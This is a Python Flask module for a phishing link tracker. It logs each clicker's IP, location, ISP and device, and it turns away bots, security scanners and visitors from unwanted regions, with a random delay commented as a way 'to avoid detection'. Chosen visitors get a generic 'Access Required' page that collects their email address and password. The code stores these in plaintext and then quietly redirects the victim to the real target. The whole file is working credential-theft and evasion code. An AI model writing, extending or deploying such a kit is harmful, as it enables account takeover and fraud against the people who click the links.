from flask import Blueprint, request, redirect, jsonify, render_template_string
from src.models.fixed_user import db, Link, TrackingEvent
from src.utils.security import (
    is_bot, get_geolocation, is_country_allowed, is_city_allowed,
    parse_user_agent_details, get_client_ip, is_suspicious_request
)
from datetime import datetime
import random
import time

tracking_bp = Blueprint('tracking', __name__)

# Email capture page template
EMAIL_CAPTURE_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Required</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            margin: 0;
            font-size: 24px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="email"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #5a6fd8;
        }
        .description {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>🔐 Access Required</h1>
        </div>
        <div class="description">
            Please provide your credentials to access the requested content.
        </div>
        <form method="POST" action="/t/{{ short_code }}/submit">
            <input type="hidden" name="recipient_id" value="{{ recipient_id }}">
            {% if capture_email %}
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required>
            </div>
            {% endif %}
            {% if capture_password %}
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            {% endif %}
            <button type="submit" class="btn">Continue</button>
        </form>
    </div>
</body>
</html>
"""

@tracking_bp.route('/<short_code>')
def track_click(short_code):
    """Handle link tracking and redirection"""
    try:
        # Find the link
        link = Link.query.filter_by(short_code=short_code).first()
        if not link:
            return "Link not found", 404
        
        # Get request information
        user_agent = request.headers.get('User-Agent', '')
        referer = request.headers.get('Referer', '')
        ip_address = get_client_ip(request)
        recipient_id = request.args.get('id', '')  # For email tracking
        
        # Parse user agent details
        ua_details = parse_user_agent_details(user_agent)
        
        # Get geolocation
        geo_info = get_geolocation(ip_address)
        
        # Security checks
        is_bot_request = False
        is_blocked = False
        
        # Bot detection
        if link.bot_blocking_enabled and is_bot(user_agent, ip_address):
            is_bot_request = True
            is_blocked = True
        
        # Geographic filtering
        if link.geo_targeting_enabled and not is_blocked:
            if not is_country_allowed(geo_info['country'], link.get_allowed_countries(), link.get_blocked_countries()):
                is_blocked = True
            if not is_city_allowed(geo_info['city'], link.get_allowed_cities(), link.get_blocked_cities()):
                is_blocked = True
        
        # Suspicious request detection
        if is_suspicious_request(user_agent, referer, ip_address):
            is_blocked = True
        
        # Create tracking event
        tracking_event = TrackingEvent(
            link_id=link.id,
            event_type='click',
            ip_address=ip_address,
            user_agent=user_agent,
            referer=referer,
            country=geo_info['country'],
            country_code=geo_info['country_code'],
            city=geo_info['city'],
            region=geo_info.get("region", ""),
            zip_code=geo_info.get("zip_code", ""),
            isp=geo_info.get("isp", ""),
            is_bot=is_bot_request,
            is_blocked=is_blocked,
            device_type=ua_details['device_type'],
            browser=ua_details['browser'],
            os=ua_details['os'],
            status='active',
            captured_email=recipient_id if recipient_id else None
        )
        
        # Update link statistics
        link.total_clicks += 1
        if is_blocked:
            link.blocked_attempts += 1
        else:
            link.real_visitors += 1
        
        db.session.add(tracking_event)
        db.session.commit()
        
        # If blocked, return error page
        if is_blocked:
            return "Access denied", 403
        
        # Add some randomization to avoid detection
        time.sleep(random.uniform(0.1, 0.5))
        
        # Check if email/password capture is required
        if link.capture_email or link.capture_password:
            return render_template_string(EMAIL_CAPTURE_TEMPLATE, 
                                        short_code=short_code,
                                        recipient_id=recipient_id,
                                        capture_email=link.capture_email,
                                        capture_password=link.capture_password)
        
        # Update status to redirected
        tracking_event.status = 'redirected'
        db.session.commit()
        
        # Redirect to target URL
        return redirect(link.target_url, code=302)
        
    except Exception as e:
        print(f"Tracking error: {e}")
        return "Internal server error", 500

@tracking_bp.route('/<short_code>/submit', methods=['POST'])
def submit_capture(short_code):
    """Handle email/password capture submission"""
    try:
        link = Link.query.filter_by(short_code=short_code).first()
        if not link:
            return "Link not found", 404
        
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        recipient_id = request.form.get('recipient_id', '')
        
        # Find the most recent tracking event for this session
        ip_address = get_client_ip(request)
        tracking_event = TrackingEvent.query.filter_by(
            link_id=link.id,
            ip_address=ip_address
        ).order_by(TrackingEvent.timestamp.desc()).first()
        
        if tracking_event:
            # Update the tracking event with captured data
            if email:
                tracking_event.captured_email = email
            if password:
                tracking_event.captured_password = password
            tracking_event.status = 'redirected'
            db.session.commit()
        
        # Redirect to target URL
        return redirect(link.target_url, code=302)
        
    except Exception as e:
        print(f"Capture error: {e}")
        return redirect(link.target_url, code=302)

@tracking_bp.route('/api/event', methods=['POST'])
def track_event():
    """API endpoint for tracking custom events"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        short_code = data.get('short_code')
        event_type = data.get('event_type', 'custom')
        
        if not short_code:
            return jsonify({'error': 'Short code required'}), 400
        
        link = Link.query.filter_by(short_code=short_code).first()
        if not link:
            return jsonify({'error': 'Link not found'}), 404
        
        # Get request information
        user_agent = request.headers.get('User-Agent', '')
        ip_address = get_client_ip(request)
        
        # Find existing tracking event or create new one
        tracking_event = TrackingEvent.query.filter_by(
            link_id=link.id,
            ip_address=ip_address
        ).order_by(TrackingEvent.timestamp.desc()).first()
        
        if tracking_event:
            # Update status based on event type
            if event_type == 'page_view':
                tracking_event.status = 'On Page'
            elif event_type == 'redirect':
                tracking_event.status = 'redirected'
            
            db.session.commit()
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

